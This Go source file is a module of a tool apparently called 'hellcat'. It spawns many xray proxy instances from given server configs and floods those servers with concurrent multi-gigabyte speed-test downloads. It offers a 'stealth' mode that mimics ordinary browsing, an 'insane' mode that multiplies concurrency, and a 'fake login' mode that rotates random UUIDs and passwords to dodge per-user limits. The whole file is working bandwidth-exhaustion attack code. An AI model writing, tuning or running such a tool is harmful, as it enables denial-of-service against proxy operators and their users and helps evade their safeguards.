package stressor

import (
    "crypto/rand"
    "crypto/tls"
    "fmt"
    "io"
    "log"
    "math/big"
    mathrand "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "runtime"
    "sync"
    "sync/atomic"
    "time"

    "hellcat/config"
    "hellcat/parser"
)

type XrayInstance struct {
    Cmd      *exec.Cmd
    Cfg      *parser.OutboundConfig
    Port     int
    ConfPath string
}

var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
}

var payloads = []string{
    "https://speed.cloudflare.com/__down?bytes=10737418240",
    "https://speed.cloudflare.com/__down?bytes=50000000000",
    "http://speedtest.tele2.net/10GB.zip",
    "http://speedtest.tele2.net/1GB.zip",
    "http://proof.ovh.net/files/10Gb.dat",
    "https://proof.ovh.net/files/10Gb.dat",
    "http://proof.ovh.net/files/1Gb.dat",
    "http://bouygues.iperf.fr/10G.iso",
    "http://speedtest.ftp.otenet.gr/files/test1Gb.db",
    "https://speed.hetzner.de/1GB.bin",
    "http://ipv4.download.thinkbroadband.com/1GB.zip",
}

var stealthURLs = []string{
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/r/popular/.json?limit=100",
    "https://www.amazon.com/",
    "https://www.microsoft.com/en-us/windows",
    "https://www.github.com/",
    "https://en.wikipedia.org/wiki/Main_Page",
    "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png",
    "https://github.com/ArtalkJS/Artalk/releases/download/v2.8.2/artalk_v2.8.2_linux_amd64.tar.gz",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.tiktok.com/",
    "https://t.me/",
    "https://discord.com/",
    "https://www.bbc.com/",
    "https://edition.cnn.com/",
    "https://www.nytimes.com/",
    "https://www.theguardian.com/",
    "https://www.wsj.com/",
    "https://stackoverflow.com/",
    "https://hub.docker.com/",
    "https://www.npmjs.com/",
    "https://pkg.go.dev/",
    "https://dev.to/",
    "https://news.ycombinator.com/",
    "https://www.dropbox.com/",
    "https://drive.google.com/",
    "https://www.icloud.com/",
    "https://imgur.com/",
    "https://flickr.com/",
    "https://www.netflix.com/",
    "https://www.spotify.com/",
    "https://www.twitch.tv/",
    "https://www.imdb.com/",
    "https://www.khanacademy.org/",
    "https://www.coursera.org/",
    "https://www.udemy.com/",
    "https://www.wolframalpha.com/",
    "https://www.ebay.com/",
    "https://www.aliexpress.com/",
    "https://www.walmart.com/",
    "https://www.target.com/",
    "https://weather.com/",
    "https://www.accuweather.com/",
    "https://www.google.com/maps",
    "https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css",
    "https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap",
    "https://cdn.pixabay.com/photo/2023/01/01/12/34/sample-768x512.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/a/a5/Example.jpg",
    "https://jsonplaceholder.typicode.com/posts/1",
    "https://api.github.com/repos/golang/go",
    "https://api.weather.gov/points/39.7456,-97.0892",
    "https://wordpress.org/",
    "https://medium.com/",
    "https://habr.com/ru/all/",
    "https://store.steampowered.com/",
    "https://www.epicgames.com/",
}

var (
    requests        uint64
    errors          uint64
    bytesDownloaded uint64
    activeWorkers   int32
    stealthMode     bool
    customURL       string
    fakeLoginMode   bool
    insaneMode      bool
    burstSize       int = 3 // сколько параллельных загрузок делает один воркер за такт
)


var bufPool = sync.Pool{
    New: func() interface{} {
        b := make([]byte, 1024*1024) // 1MB
        return &b
    },
}

// fastDiscard — читает тело ответа 1MB буфером, минуя io.Discard.ReadFrom (32KB)
func fastDiscard(r io.Reader) int64 {
    buf := bufPool.Get().(*[]byte)
    defer bufPool.Put(buf)

    var total int64
    for {
        n, err := r.Read(*buf)
        total += int64(n)
        if err != nil {
            break
        }
    }
    return total
}



func getRandomPort() int {
    for i := 0; i < 100; i++ {
        port := mathrand.Intn(55000) + 10000
        ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
        if err == nil {
            ln.Close()
            return port
        }
    }
    ln, err := net.Listen("tcp", "127.0.0.1:0")
    if err != nil {
        return 0
    }
    port := ln.Addr().(*net.TCPAddr).Port
    ln.Close()
    return port
}

func formatSpeed(bytesPerSec float64) string {
    if bytesPerSec >= 1024*1024*1024 {
        return fmt.Sprintf("%.2f GB/s", bytesPerSec/1024/1024/1024)
    }
    if bytesPerSec >= 1024*1024 {
        return fmt.Sprintf("%.1f MB/s", bytesPerSec/1024/1024)
    }
    if bytesPerSec >= 1024 {
        return fmt.Sprintf("%.0f KB/s", bytesPerSec/1024)
    }
    return fmt.Sprintf("%.0f B/s", bytesPerSec)
}

// ========== FAKE LOGIN ==========

func generateUUID() string {
    b := make([]byte, 16)
    _, err := rand.Read(b)
    if err != nil {
        return "00000000-0000-0000-0000-000000000000"
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func generatePassword(length int) string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    result := make([]byte, length)
    for i := 0; i < length; i++ {
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
        result[i] = chars[n.Int64()]
    }
    return string(result)
}

func mutateCredentials(cfg *parser.OutboundConfig) {
    switch s := cfg.Settings.(type) {
    case parser.VnextSettings:
        for i := range s.Vnext {
            for j := range s.Vnext[i].Users {
                s.Vnext[i].Users[j].Id = generateUUID()
            }
        }
        cfg.Settings = s
    case parser.VMessSettings:
        for i := range s.Vnext {
            for j := range s.Vnext[i].Users {
                s.Vnext[i].Users[j].Id = generateUUID()
            }
        }
        cfg.Settings = s
    case parser.ServerSettings:
        for i := range s.Servers {
            if cfg.Protocol == "tuic" {
                s.Servers[i].Uuid = generateUUID()
            }
            s.Servers[i].Password = generatePassword(16)
        }
        cfg.Settings = s
    }
}

func restartInstance(inst *XrayInstance) {
    mutateCredentials(inst.Cfg)

    var newCred string
    switch s := inst.Cfg.Settings.(type) {
    case parser.VnextSettings:
        if len(s.Vnext) > 0 && len(s.Vnext[0].Users) > 0 {
            newCred = fmt.Sprintf("UUID: %s", s.Vnext[0].Users[0].Id)
        }
    case parser.VMessSettings:
        if len(s.Vnext) > 0 && len(s.Vnext[0].Users) > 0 {
            newCred = fmt.Sprintf("UUID: %s", s.Vnext[0].Users[0].Id)
        }
    case parser.ServerSettings:
        if len(s.Servers) > 0 {
            if inst.Cfg.Protocol == "tuic" {
                newCred = fmt.Sprintf("UUID: %s, Pass: %s", s.Servers[0].Uuid, s.Servers[0].Password)
            } else {
                newCred = fmt.Sprintf("Pass: %s", s.Servers[0].Password)
            }
        }
    }
    log.Printf("[hellcat] 🔑 [Port %d] Restarting -> %s", inst.Port, newCred)

    if inst.Cmd != nil && inst.Cmd.Process != nil {
        inst.Cmd.Process.Kill()
        inst.Cmd.Wait()
    }

    os.Remove(inst.ConfPath)
    newConfPath := config.GenerateWithPort(inst.Cfg, inst.Port)
    inst.ConfPath = newConfPath

    cmd := exec.Command("xray", "-config", newConfPath)
    cmd.Stdout = nil
    cmd.Stderr = nil
    if err := cmd.Start(); err != nil {
        log.Printf("[hellcat] ❌ Failed to restart xray on port %d: %v", inst.Port, err)
        return
    }
    inst.Cmd = cmd

    go func() {
        if err := cmd.Wait(); err != nil {
            log.Printf("[hellcat] ⚠️  xray (port %d) exited: %v", inst.Port, err)
        }
    }()
}



func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, insane bool, stealth bool, customTarget string, fakelogin bool) {
    stealthMode = stealth
    customURL = customTarget // ИСПРАВЛЕНО: было customURL = customURL (самоприсвоение)
    fakeLoginMode = fakelogin
    insaneMode = insane

    if insaneMode {
        burstSize = 8 // В insane-режиме каждый воркер стреляет 8 параллельных запросов
    }

    if customURL != "" {
        payloads = []string{customTarget}
        stealthURLs = []string{customTarget}
    }

    modeStr := "HEAVY BANDWIDTH"
    if stealthMode {
        modeStr = "STEALTH BANDWIDTH"
    }
    if insaneMode {
        modeStr = "🔥 INSANE " + modeStr
    }

    log.Printf("[hellcat] 🌊 %s MODE ENGAGED", modeStr)
    if fakeLoginMode {
        log.Printf("[hellcat] 🔑 FAKE LOGIN ENABLED (Rotating credentials every 1000 reqs)")
    }
    log.Printf("[hellcat] 📊 %d xray instances | %d threads | burst=%d", numXray, threads, burstSize)

    if len(cfgs) > 1 {
        for i, c := range cfgs {
            log.Printf("[hellcat] 🌐 [%d/%d] %s (%s)", i+1, len(cfgs), getTargetInfo(c), c.Protocol)
        }
    } else if len(cfgs) == 1 {
        log.Printf("[hellcat] 🌐 Primary: %s (%s)", getTargetInfo(cfgs[0]), cfgs[0].Protocol)
    }

    stop := make(chan struct{})
    if duration > 0 {
        log.Printf("[hellcat] ⏱️  Duration: %d sec", duration)
        time.AfterFunc(time.Duration(duration)*time.Second, func() {
            log.Println("[hellcat] ⏰ Stopping...")
            close(stop)
        })
    }

    instances := make([]*XrayInstance, numXray)
    log.Println("[hellcat] ⏳ Generating random configs and starting Xray instances...")
    for i := 0; i < numXray; i++ {
        port := getRandomPort()

        cfgCopy := *cfgs[i%len(cfgs)]
        cfg := &cfgCopy

        if fakeLoginMode {
            mutateCredentials(cfg)
        }

        confPath := config.GenerateWithPort(cfg, port)

        cmd := exec.Command("xray", "-config", confPath)
        cmd.Stdout = nil
        cmd.Stderr = nil
        if err := cmd.Start(); err != nil {
            log.Printf("[hellcat] ❌ xray [%d] start: %v", i, err)
            continue
        }

        instances[i] = &XrayInstance{
            Cmd:      cmd,
            Cfg:      cfg,
            Port:     port,
            ConfPath: confPath,
        }

        log.Printf("[hellcat] ✓ xray [%d] PID %d Port %d", i, cmd.Process.Pid, port)
        go func(c *exec.Cmd, idx int) {
            if err := c.Wait(); err != nil {
                log.Printf("[hellcat] ⚠️  xray [%d] exited: %v", idx, err)
            }
        }(cmd, i)

        time.Sleep(50 * time.Millisecond) // Ускорено: было 150ms
    }

    // Ожидание SOCKS-прокси
    log.Println("[hellcat] ⏳ Waiting for SOCKS proxies...")
    for _, inst := range instances {
        if inst == nil {
            continue
        }
        addr := fmt.Sprintf("127.0.0.1:%d", inst.Port)
        for i := 0; i < 30; i++ {
            conn, err := net.DialTimeout("tcp", addr, 300*time.Millisecond)
            if err == nil {
                conn.Close()
                break
            }
            time.Sleep(300 * time.Millisecond) // Ускорено: было 500ms
        }
    }

    
    clients := make([]*http.Client, numXray)
    for i, inst := range instances {
        if inst == nil {
            continue
        }
        proxyURL, _ := url.Parse(fmt.Sprintf("socks5h://127.0.0.1:%d", inst.Port))
        tr := &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
            DialContext: (&net.Dialer{
                Timeout:   10 * time.Second, // Быстрее fail на недоступных
                KeepAlive: 30 * time.Second,
            }).DialContext,
            TLSClientConfig:        &tls.Config{InsecureSkipVerify: true},
            DisableKeepAlives:      false,
            DisableCompression:     true, // 🔥 КЛЮЧЕВАЯ ОПТИМИЗАЦИЯ: не тратим CPU на gzip
            MaxIdleConns:           50000,
            MaxIdleConnsPerHost:    50000,
            MaxConnsPerHost:        0, // 0 = без лимита
            IdleConnTimeout:        0,
            TLSHandshakeTimeout:   10 * time.Second,
            ResponseHeaderTimeout:  0, // 0 = без таймаута на заголовки для больших файлов
            ReadBufferSize:         1 << 20, // 🔥 1MB kernel read buffer
            WriteBufferSize:        1 << 20, // 🔥 1MB kernel write buffer
        }
        clients[i] = &http.Client{
            Transport: tr,
            Timeout:   0, // Без общего таймаута — большие файлы качаются долго
        }
    }

   
    streamsPerProxy := threads / numXray
    if streamsPerProxy < 10 {
        streamsPerProxy = 10 // Увеличено: было 5
    }
    if insaneMode {
        streamsPerProxy = streamsPerProxy * 2 // Insane: вдвое больше воркеров
    }
    totalGoroutines := streamsPerProxy * numXray
    effectiveConcurrent := totalGoroutines * burstSize
    log.Printf("[hellcat] 🚀 Spawning %d workers (burst=%d → %d concurrent downloads)...",
        totalGoroutines, burstSize, effectiveConcurrent)

    for i := 0; i < numXray; i++ {
        if clients[i] == nil {
            continue
        }
        client := clients[i]
        for j := 0; j < streamsPerProxy; j++ {
            atomic.AddInt32(&activeWorkers, 1)
            go func(c *http.Client) {
                defer atomic.AddInt32(&activeWorkers, -1)
                for {
                    select {
                    case <-stop:
                        return
                    default:
                        if stealthMode {
                            stealthBurst(c)
                        } else {
                            downloadBurst(c)
                        }
                    }
                }
            }(client)
        }
    }

    lastRotationReq := uint64(0)

    ticker := time.NewTicker(3 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-stop:
            goto cleanup
        case <-ticker.C:
            succ := atomic.LoadUint64(&requests)
            fail := atomic.LoadUint64(&errors)
            bytes := atomic.SwapUint64(&bytesDownloaded, 0)

            speed := formatSpeed(float64(bytes) / 3.0)
            goroutines := runtime.NumGoroutine()

            log.Printf("[hellcat] 🌊 %s | Req: %d | Err: %d | Active: %d | Goroutines: %d",
                speed, succ, fail, atomic.LoadInt32(&activeWorkers), goroutines)

            if fakeLoginMode && succ > 0 {
                currentThousand := succ / 1000
                lastThousand := lastRotationReq / 1000
                if currentThousand > lastThousand {
                    lastRotationReq = succ
                    log.Printf("[hellcat] 🔑 Crossed %dk requests! Rotating credentials & restarting Xrays...", currentThousand*1000)

                    go func() {
                        for _, inst := range instances {
                            if inst != nil {
                                restartInstance(inst)
                            }
                        }
                        log.Println("[hellcat] 🔑 Xrays restarted with new identities. Resuming...")
                    }()
                }
            }
        }
    }

cleanup:
    time.Sleep(1 * time.Second) // Ускорено: было 3s
    for _, inst := range instances {
        if inst != nil {
            if inst.Cmd != nil && inst.Cmd.Process != nil {
                inst.Cmd.Process.Kill()
            }
            os.Remove(inst.ConfPath)
        }
    }
    log.Println("[hellcat] ✅ Finished.")
}



func downloadBurst(client *http.Client) {
    var wg sync.WaitGroup
    for i := 0; i < burstSize; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            downloadSingle(client)
        }()
    }
    wg.Wait()
}

func stealthBurst(client *http.Client) {
    var wg sync.WaitGroup
    for i := 0; i < burstSize; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            stealthSingle(client)
        }()
    }
    wg.Wait()
}


func downloadSingle(client *http.Client) {
    target := payloads[mathrand.Intn(len(payloads))]
    req, _ := http.NewRequest("GET", target, nil)
    req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])
    req.Header.Set("Accept-Encoding", "identity") // Не запрашивать сжатие

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(1+mathrand.Intn(5)) * time.Millisecond) // Минимальная пауза
        return
    }
    defer resp.Body.Close()

    
    n := fastDiscard(resp.Body)
    atomic.AddUint64(&bytesDownloaded, uint64(n))

    if n > 0 {
        atomic.AddUint64(&requests, 1)
    } else {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(1+mathrand.Intn(3)) * time.Millisecond)
    }
}

func stealthSingle(client *http.Client) {
    target := stealthURLs[mathrand.Intn(len(stealthURLs))]
    req, _ := http.NewRequest("GET", target, nil)
    req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Encoding", "identity")

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(1+mathrand.Intn(5)) * time.Millisecond)
        return
    }
    defer resp.Body.Close()

    
    n := fastDiscard(resp.Body)
    atomic.AddUint64(&bytesDownloaded, uint64(n))

    if n > 0 {
        atomic.AddUint64(&requests, 1)
    } else {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(1+mathrand.Intn(3)) * time.Millisecond)
    }
}

func getTargetInfo(cfg *parser.OutboundConfig) string {
    var host string
    var port int
    var network string
    var security string

    if cfg.StreamSetting != nil {
        network = cfg.StreamSetting.Network
        security = cfg.StreamSetting.Security
    }

    switch s := cfg.Settings.(type) {
    case parser.VnextSettings:
        if len(s.Vnext) > 0 {
            host = s.Vnext[0].Address
            port = s.Vnext[0].Port
        }
    case parser.VMessSettings:
        if len(s.Vnext) > 0 {
            host = s.Vnext[0].Address
            port = s.Vnext[0].Port
        }
    case parser.ServerSettings:
        if len(s.Servers) > 0 {
            host = s.Servers[0].Address
            port = s.Servers[0].Port
        }
    }

    return fmt.Sprintf("%s:%d (%s/%s)", host, port, network, security)
}
